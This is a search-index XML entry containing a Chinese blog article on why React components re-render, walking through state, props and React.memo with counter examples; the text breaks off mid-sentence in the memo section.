<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>为什么React会重新渲染</title>
      <link href="/2024/12/19/frontend/react/wei-shi-me-react-hui-chong-xin-xuan-ran/"/>
      <url>/2024/12/19/frontend/react/wei-shi-me-react-hui-chong-xin-xuan-ran/</url>
      
        <content type="html"><![CDATA[<p><font style="color:rgb(55, 71, 91);">更新（重新渲染）是 React 的重要特性 —— 当用户与应用交互的时候，React 需要重新渲染、更新 UI，以响应用户的输入。但是，React 为什么会重新渲染呢？如果不知道 React 为什么会重新渲染，我们如何才能避免额外的重新渲染呢？</font></p><h2 id="TF8Xf">TL; DR</h2>**状态改变是 React 树内部发生更新的唯二原因之一**<font style="color:rgb(55, 71, 91);">。</font><p><font style="color:rgb(55, 71, 91);">这句话是 React 更新的公理，</font><strong>不存在任何例外</strong><font style="color:rgb(55, 71, 91);">。本文也将会围绕解释这句话展开。为了避免有人抬杠，这句话引入了一些限制定语和关键词：</font></p><h2 id="iI1TG">名词解释</h2><h3 id="Dlp27">「更新」和「重新渲染」</h3><font style="color:rgb(55, 71, 91);">在 React 中，「更新」和「重新渲染」是关系紧密，但是含义完全不同的两个词。下面这句话才能正确表达这两个词的正确含义：</font><p><font style="color:rgb(55, 71, 91);">React 的「更新」包含三个阶段：渲染（Render），使用 createElement 或 jsx-runtime 产生全新的 React Element 对象、组装出一颗 React 树；Reconcilation，React Reconciler 比较 新生成的 React 树 和 当前的 React 树，判断如何用最高效的方法实现「更新」；Commit，操作 Host（如 DOM、Native 等），使新的 UI 呈现在用户面前。</font></p><p><font style="color:rgb(55, 71, 91);">大部分开发者会把「更新」和「重新渲染」混为一谈，因为在上述三个阶段中，只有「渲染」这一阶段是开发者可以控制的（「Reconcilation」和「Commit」分别由</font><font style="color:rgb(55, 71, 91);"> </font><code>react-reconciler</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">和 React Host 控制）。本文接下来的部分中，「重新渲染」一律指代 React 组件在「更新」时的「渲染」阶段，而「更新」则一律指代（重新）渲染、Reconcilation 和 Commit 整个过程。</font></p><h3 id="rRJnW">「React 树」和「React 树内部」</h3><font style="color:rgb(55, 71, 91);">React Tree 本身可以在任意时候更新。实际上，如果你曾经通过 React 文档学习 React，你在「Hello World」一章就已经见过这个 Pattern 了：</font><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">tick</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> element = (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>It is &#123;new Date().toLocaleTimeString()&#125;.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">  root.<span class="title function_">render</span>(element);</span><br><span class="line">  <span class="comment">// 如果你是在 React 18 发布以前学习的 React，你可能会用 ReactDOM.render()：</span></span><br><span class="line">  <span class="comment">// ReactDOM.render(element, document.getElementById(&#x27;root&#x27;));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(tick, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 71, 91);">每秒钟调用一次 ReactDOM 提供的</font><font style="color:rgb(55, 71, 91);"> </font><code>render</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">使一整颗 React 树进行了完整的更新。但是绝大部分时候，你不会更新一整颗 React 树，而是 React 树内的一部分组件（在 React 应用中，你只会调用一次</font><font style="color:rgb(55, 71, 91);"> </font><code>createRoot().render</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">或者</font><font style="color:rgb(55, 71, 91);"> </font><code>hydrateRoot()</code><font style="color:rgb(55, 71, 91);">）。</font></p><h3 id="HUmwc">「唯二原因」</h3><font style="color:rgb(55, 71, 91);">如果你在使用 React class 组件，那么你可以使用继承自</font><font style="color:rgb(55, 71, 91);"> </font>`React.Component`<font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的</font><font style="color:rgb(55, 71, 91);"> </font>`forceUpdate`<font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">方法更新一个组件：</font><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyComponent</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">handleInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">forceUpdate</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 71, 91);">因此，我们也可以把这句话改写成：</font><strong>如果一颗 React 树中所有的 class 组件都没有使用 forceUpdate 方法，那么状态改变是这颗 React Tree 内部发生更新的唯一原因</strong><font style="color:rgb(55, 71, 91);">。</font></p><hr><p><font style="color:rgb(55, 71, 91);">在正文开始之前，先放出一句非常具有迷惑性的话：</font></p><p><strong>误区 0</strong><font style="color:rgb(55, 71, 91);">：React 组件更新有三个原因：状态改变，prop 改变，Context 改变。</font></p><p><font style="color:rgb(55, 71, 91);">如果你去问一些使用 React 的开发者「为什么 React 会更新&#x2F;重新渲染」，大概会得到这个答案。这句话不无道理，但是并不能反应真实的 React 更新机制。</font></p><p><font style="color:rgb(55, 71, 91);">本文只会介绍 React 为什么会发生更新，不会介绍如何避免「不必要」的更新（也许我会以这个为话题另外写一篇文章？）。</font></p><h2 id="Zhuang-Tai-Geng-Xin-He-Dan-Xiang-Shu-Ju-Liu">状态更新和单向数据流</h2><font style="color:rgb(55, 71, 91);">让我们以计数器为例：</font><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">BigNumber</span> = (<span class="params">&#123; number &#125;</span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontWeight:</span> <span class="attr">700</span>, <span class="attr">fontSize:</span> <span class="attr">36</span> &#125;&#125;&gt;</span>&#123;number&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> handleButtonClick = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>), []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">BigNumber</span> <span class="attr">number</span>=<span class="string">&#123;count&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleButtonClick&#125;</span>&gt;</span>Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Counter</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://skk.moe/&quot;</span>&gt;</span>Sukka<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 71, 91);">在这个例子中，我们声明了三个组件，根组件</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;App /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">渲染了</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);">；而</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">渲染了</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);">。在</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件中，我们声明了一个组件内的状态</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);">，当点击按钮时会改变状态</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);">、使其递增。</font></p><p><font style="color:rgb(55, 71, 91);">当我们点击按钮的时候，</font><code>setCount</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">被调用、</font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态发生改变，React 更新了</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件。而</font><strong>当 React 更新一个组件时，也会更新这个组件下的所有子组件</strong><font style="color:rgb(55, 71, 91);">（至于为什么，很快就会讲的）。因此</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件更新时，子组件</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">也会更新。</font></p><p><font style="color:rgb(55, 71, 91);">现在让我们先厘清一个最简单的误区：</font></p><p><strong>误区 1</strong><font style="color:rgb(55, 71, 91);">：当一个状态发生改变时，整颗 React 树都会更新。</font></p><p><font style="color:rgb(55, 71, 91);">有少数使用 React 的开发者会相信这一点（还好不是大多数！）。实际上，当状态发生改变的时候，React 只会更新「拥有这个状态」的组件，和这个组件的所有子组件。</font></p><p><font style="color:rgb(55, 71, 91);">为什么父组件（在这个例子中，</font><code>&lt;App /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">是</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的父组件）没有发生更新呢？因为 React 的主要任务就是保持 React 内的状态和 React 渲染的 UI 的同步。React 更新，就是找出如何改变 UI，使其和新的状态同步。而在 React 中，数据是自上而下单向传递的（单向数据流，The Data Flows Down）。在这个例子中，</font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件的状态</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">向下流向了</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件的 prop</font><font style="color:rgb(55, 71, 91);"> </font><code>number</code><font style="color:rgb(55, 71, 91);">，但是不可能向上流向了</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;App /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件。因此，</font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态改变，</font><code>&lt;App /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件并不需要更新。</font></p><p><font style="color:rgb(55, 71, 91);">当</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态改变时，</font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件及其子组件</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">都发生了更新。而</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件更新时，使用了 prop</font><font style="color:rgb(55, 71, 91);"> </font><code>number</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的新的值进行渲染。那么</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件更新的原因是因为 prop</font><font style="color:rgb(55, 71, 91);"> </font><code>number</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的改变吗？</font></p><h2 id="Bu-He-props-Wan-Quan-Mei-You-Guan-Xi">不，和 props 完全没有关系</h2>**误区 2**<font style="color:rgb(55, 71, 91);">：React 组件更新的其中一个原因是它的 prop 发生了改变。</font><p><font style="color:rgb(55, 71, 91);">现在让我们修改一下上面那个例子：</font></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">BigNumber</span> <span class="keyword">from</span> <span class="string">&#x27;./big-number&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">SomeDecoration</span> = (<span class="params"></span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hooray!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> handleButtonClick = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>), []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">BigNumber</span> <span class="attr">number</span>=<span class="string">&#123;count&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleButtonClick&#125;</span>&gt;</span>Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">SomeDecoration</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Counter</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://skk.moe/&quot;</span>&gt;</span>Sukka<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件不接受任何 prop、不使用其父组件</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态，但是当</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态发生改变时，</font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件仍然发生了更新。当一个组件更新时，React 会更新</font><font style="color:rgb(55, 71, 91);"> </font><strong>所有的子组件</strong><font style="color:rgb(55, 71, 91);">，不管这个子组件是否接受一个 prop：React 并不能百分之百肯定</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件是否直接&#x2F;间接地依赖了</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态。</font></p><p><font style="color:rgb(55, 71, 91);">理想中，每一个 React 组件都应该是一个</font><font style="color:rgb(55, 71, 91);"> </font><a href="https://en.wikipedia.org/wiki/Pure_function"><font style="color:rgb(55, 71, 91);">纯函数</font></a><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">—— 一个「纯」的 React 组件，当输入相同的 props 时，总是会渲染相同的 UI。但是现实是骨感的，我们非常容易写出一个「不纯」的 React 组件：</font></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">CurrentTime</span> = (<span class="params"></span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Last rendered at &#123;new Date().toString()&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>&lt;CurrentTime /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件不接受任何 prop，但是每次渲染得到的 UI 却是不一样的。</font></p><p><font style="color:rgb(55, 71, 91);">包含了状态（使用了</font><font style="color:rgb(55, 71, 91);"> </font><code>useState</code><font style="color:rgb(55, 71, 91);">）的组件也不是纯组件：即使 prop 不改变，组件也会因为状态不同而渲染出不同的 UI。</font></p><p><font style="color:rgb(55, 71, 91);">有的时候，你很难判断一个组件是否是纯组件。你可能会将一个 Ref 作为 prop 传递给一个组件（</font><code>forwardRef</code><font style="color:rgb(55, 71, 91);">，</font><code>useImperativeHandle</code><font style="color:rgb(55, 71, 91);">，诸如此类的 case）。Ref 本身是 Reference Stable 的、React 并不能知道 Ref 中的值是否改变。</font></p><p><font style="color:rgb(55, 71, 91);">React 的目标是展示最新、维持一致的 UI。为了避免向用户展示过时的 UI，当父组件更新时，React 会更新所有子组件，即使子组件不接受任何 prop。</font><strong>props 和组件更新没有任何关系</strong><font style="color:rgb(55, 71, 91);">。</font></p><h2 id="Chun-Zu-Jian-He-memo">纯组件和 memo</h2><font style="color:rgb(55, 71, 91);">你大概很熟悉（或者至少听说过）</font>`React.memo`<font style="color:rgb(55, 71, 91);">、</font>`shouldComponentUpdate`<font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">或者</font><font style="color:rgb(55, 71, 91);"> </font>`React.PureComponent`<font style="color:rgb(55, 71, 91);">，这些工具允许我们「忽略更新」：</font><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">SomeDecoration</span> = <span class="title function_">memo</span>(<span class="function">() =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hooray!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 71, 91);">当我们将</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件的声明包裹在</font><font style="color:rgb(55, 71, 91);"> </font><code>memo</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">中时，我们实际上做的是告诉 React「嘿！我觉得这是个纯组件，只要它的 prop 不改变，我们就别更新它」。</font></p><p><font style="color:rgb(55, 71, 91);">现在，让我们把</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">和</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">都包裹在 memo 中，看看会发生什么：</font></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">BigNumber</span> = <span class="title function_">memo</span>(<span class="function">(<span class="params">&#123; number &#125;</span>) =&gt;</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontWeight:</span> <span class="attr">700</span>, <span class="attr">fontSize:</span> <span class="attr">36</span> &#125;&#125;&gt;</span>&#123;number&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">SomeDecoration</span> = <span class="title function_">memo</span>(<span class="function">() =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hooray!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> handleButtonClick = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>), []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">BigNumber</span> <span class="attr">number</span>=<span class="string">&#123;count&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleButtonClick&#125;</span>&gt;</span>Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">SomeDecoration</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Counter</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://skk.moe/&quot;</span>&gt;</span>Sukka<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 71, 91);">现在，当</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态更新后，React 会更新</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件及其所有子组件，</font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">和</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);">。由于</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">接受一个 prop</font><font style="color:rgb(55, 71, 91);"> </font><code>number</code><font style="color:rgb(55, 71, 91);">，而</font><font style="color:rgb(55, 71, 91);"> </font><code>number</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的值发生了改变，因此</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;BigNumber /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">会更新。但是</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的 prop 没有发生改变（因为不接受任何 prop），所以 React 跳过了</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的更新。</font></p><p><font style="color:rgb(55, 71, 91);">于是你想，为什么 React 不默认所有组件都是纯组件呢？为什么 React 不</font><font style="color:rgb(55, 71, 91);"> </font><code>memo</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">所有组件呢？事实上，React 组件更新的开销没有想象中的那么大。以</font><font style="color:rgb(55, 71, 91);"> 